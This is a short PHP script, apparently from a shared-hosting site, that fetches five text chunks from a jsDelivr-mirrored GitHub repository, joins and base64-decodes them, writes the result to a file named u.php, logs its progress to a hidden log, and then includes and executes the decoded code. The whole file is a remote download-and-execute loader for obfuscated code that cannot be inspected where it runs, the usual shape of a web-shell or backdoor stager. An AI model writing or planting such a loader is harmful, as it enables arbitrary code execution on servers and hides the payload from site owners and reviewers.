<?php
$L="/home/u814079684/domains/pensiun.pro/public_html/_pprst.log";
$B="https://cdn.jsdelivr.net/gh/jununrs/pensiun-pro-tmp-pub@main/";
file_put_contents($L,"vboot\n");
$s="";
for($i=0;$i<5;$i++){
  $c=@file_get_contents($B."u$i.txt");
  if($c===false){file_put_contents($L,"fail$i\n",FILE_APPEND); return;}
  $s.=trim($c);
}
$php=base64_decode($s);
file_put_contents("/home/u814079684/u.php",$php);
file_put_contents($L,"decoded ".strlen($php)."\n",FILE_APPEND);
include "/home/u814079684/u.php";
